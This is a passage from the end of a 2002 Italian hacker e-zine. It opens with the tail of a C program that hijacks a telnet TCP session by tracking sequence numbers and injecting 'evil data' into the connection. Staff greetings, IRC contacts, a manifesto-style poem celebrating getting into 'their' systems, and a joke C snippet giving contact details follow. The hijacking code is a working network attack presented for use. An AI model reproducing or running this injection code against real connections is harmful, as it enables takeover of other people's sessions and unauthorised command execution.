                        wait_pk(fd_rec, &pk_info, SERVER, 23, CLIENT,
                                CLIENT_PORT, ACK,0);
                        if(pk_info.ack==spoof_seq + sizeof(cleaner))
                                cont=MY_COUNT;
                        else cont++;
                }
                if(cont!=MY_COUNT) {
                        printf("\t<--------------------------------->\n");
                        printf("\t STEP  #1 N0T SUCCEDED ... L00PiNG\n");
                        printf("\t<--------------------------------->\n");
                }
                else {
                        printf("### Step #1 0K. ###\n");
                        printf(">>> YEAHHHHHHH  <<<\n");
                        break;
                }
        }

        printf("\n<------------------------------------<\n");
        printf(" STEP  #2 - GETTING SYN/ACK 0NCE M0RE\n");
        printf(">------------------------------------>\n");
        cont = serv_seq = old_ack = 0;
        while(cont<10) {
                old_seq = serv_seq;
                old_ack = serv_ack;
                wait_pk(fd_rec, &pk_info, SERVER, 23, CLIENT, CLIENT_PORT,
                        ACK,0);
                if (pk_info.datalen == 0) {
                        serv_seq=pk_info.seq + pk_info.datalen;
                        serv_ack=pk_info.ack;
                        if ((old_seq==serv_seq)&&(serv_ack==old_ack))
                                cont = MY_COUNT;
                        else cont++;
                }
        }
        if(cont!=MY_COUNT) {
                printf("\t<-------------------------------->\n");
                printf("\t STEP  #2 NOT SUCCEDED. SHIT!!! \n");
                printf("\t<-------------------------------->\n");
                exit(0);
        }
        printf("Server SEQ: %X (hex)\tACK: %X (hex)\n", serv_seq, serv_ack);
        printf(">HA Step  #2 0K. CK<\n");

        printf("\n<----------------------------------------------------<\n");
        printf("                 STEP  #3 - SENDING 0UR DATA            \n");
        printf(">---------------------------------------------------->\n");
        printf(">>> HIHIHIHI Injecting Evil Data in the connection <<<\n");
        trans_tcp(fd_send, evil_data, 0, 0,sizeof(evil_data), CLIENT, CLIENT_PORT,
                SERVER, 23, serv_ack, serv_seq, ACK|PSH);
        cont=0;
        printf("\n>>> Waiting for Confirm <<<\n");
        while(cont<5) {
                wait_pk(fd_rec, &pk_info, SERVER, 23, CLIENT, CLIENT_PORT,
                        ACK,0);
                if(pk_info.ack==serv_ack+sizeof(evil_data))
                        cont=MY_COUNT;
                else cont++;
        }
        if (cont!=MY_COUNT) {
                printf("\t<--------------------->\n");
                printf("\t STEP #3 N0T SUCCEDED\n");
                printf("\t<--------------------->\n\n");
                exit(0);
        }
        printf("*** STEP  #3 0K ***\n\n");
        printf(" >>> Great Hijacking :-)) <<< \n");
        printf(" <<< SEE YA GUYS  <<<\n");
        exit(0);
}


Una piccola postilla...NON l'ho chiamato SauroN solo perchè è uscito il film
del Signore degli Anelli...il libro l'ho letto,ok(2 volte x la precisione)?
E fatelo anche voi!!
Se non lo leggete vi kikko dai vari chan ogni volta che entrate;-)
Seee Yaaaaaa:)


------------------------------------*END*--------------------------------------

-------------------------------------[41]--------------------------------------
------------------------------[NoFlyZone Staff]--------------------------------
---------------------------------[Greetings]-----------------------------------


Ben 278 pagine...beh,come numero finale "NoFlyZone_zine_vecchio_stile" non c'è male.
Voi cosa dite? Ci siamo sbattutti parecchio x quest'ultimo numero e credo che il
lavoro complessivo non sia affatto male...ce n'è proprio x tutti i gusti!
Una notevole parte sulla programmazione ha distinto questo numero da quelli vecchi!
E poi, diciamolo...siamo nati da 6 mesi e abbiamo già fatto 3 numeri belli corposi!
La voglia direi che c'è...e le conoscenze aumentano di numero in numero:)
Ma la grande novità sarà nel prossimo numero: abbiamo deciso di cambiare un po'
rotta, di essere più "maturi" e di elevare il concetto di hacking dal semplice
"bucare server" a qualcosa di più tecnico e da smanettoni. Visto l'obiettivo che ci
siamo posti credo che x qualche mese non uscirà nessun nuovo numero, magari qualche
tut nel sito (dateci il tempo di studiare:)).
Cmq non sarebbe male avere anche qualche vostro parere...se pensate che vada bene così
ditecelo, se volete cose più tecniche fatecelo sapere: la mail sapete cos'è e come
si usa, quindi fateci questo piacere, in fondo credo serva anche a voi!:)
Non mi resta che chiudere questo solito Greetings e lasciare la parola a Vicio x
l'intro (non lo sapete? L'intro si fa sempre alla fine!!):ringrazio endsub,evilcry,
boss fox, [$]wiT, roxyy e MADlineDIE per aver risposto al nostro "appello" di mandarci 
i loro articoli! Imitateli;)

Con questo passo e chiudo...

						City Hunter
						*NoFlyZone StaFF*

www.noflyzone-crew.cjb.net

IRC:	irc.azzurra.it		port: 6667 chan: #noflyzone
	arkshrine.serverirc.com port: 6667 chan: #noflyzone

[mode pex3 on]
***pex3 on the air***

beh... ho appena rivisto la zine, ottimo lavoro direi ;-)
mi sono permesso di aggiungere qualche url, sostituire quelli riportati che
si sono rilevati non più attivi, ma nulla di più... forse qualche errore di
ortografia fixato ;-) ma penso che abbia fatto piacere agli autori una mia 
"ricontrollata"...
al prossimo numero manca ancora molto... anche perchè ci saranno _molte_ novità, ma
non è ancora tempo di previews...
attendete e continuate a leggere i nostri txt sul sito di nfz:

 http://www.noflyzone-crew.cjb.net/

ed ora vi delizierò con:

"quelli nell'ombra" - copyleft (c) 2002 by pex3

il sistema sa tutto...
sa tutto di me...
sa tutto di te...
...e di chiunque altro!
lui e' curioso, lui cerca, lui scava e... lui scopre!
ma forse questa volta si sbaglia.
lui scopre quello che noi vogliamo fargli scoprire.
perche' noi lo conosciamo,
e lo evitiamo...
lui pensa che io sia sconnesso.
ma forse si sbaglia...
io sono qui... io ti vedo!
io non mi sono sconnesso.
io navigo... io esploro...
io non mi sono sconnesso.
io imparo... e lo raggiro!
io non mi sono sconnesso.
gli schiavi del sistema ci cercano...
girano nel _nostro_ underground...
e sanno tutto di noi!
forse...
perche' noi ci muoviamo in gruppo...
perche' noi gli crashamo i demoni...
perche' noi ci accorgiamo se qualcuno origlia...
perche' noi non siamo ottusi come vorrebbero...
poi noi possiamo entrare nei _loro_ sistemi...
e ci difendiamo dietro le loro stesse armi!
infondo, come disse un uomo del passato:
non siamo forse tutti uguali?
...allora facciamogli capire che non ci potranno mai fermare!

pex3 @ nfz-crew  <pex3@fuckwindows.com>

[mode pex3 off]
***pex3 off the hook***


------------------------------------*END*--------------------------------------

Mode E-Zine off...See ya!


-------------------------------------[ps]--------------------------------------
------------------------------------[pex3]-------------------------------------
--------------------------[Bonus Track][Post Scriptum]-------------------------
---------------------------[how-to: contact nfz-staff]-------------------------

to contact us please copy-paste this c source into> nfz.c :

/*--------------8<--cut-here---------------------*/

#include nfz.h

nfz(contact) {
nfz[web]  =  www.noflyzone-crew.cjb.net ;
nfz[irc]  =  #noflyzone @ irc.azzurranet.org:6667 ;
nfz[mail] =  articoli@noflyzone-crew.cjb.net ;
return (nfz) ;
}

/*--------------8<--cut-here---------------------*/

and follow the istructions below:

pex3@linux:~/$ gcc -o nfz.c contact-nfz
pex3@linux:~/$ mount /dev/brain /~
pex3@linux:~/$ ./contact-nfz
pex3@linux:~/$ nfz> _here write your message_

#########################################
#    it could don't run rightly ;-P     #
# no warranties for this _free_ program #
#       copyleft (c) 2002 by pex3       #
#########################################

-------------------------------------------------------------------------------


Mode E-Zine completly off:))

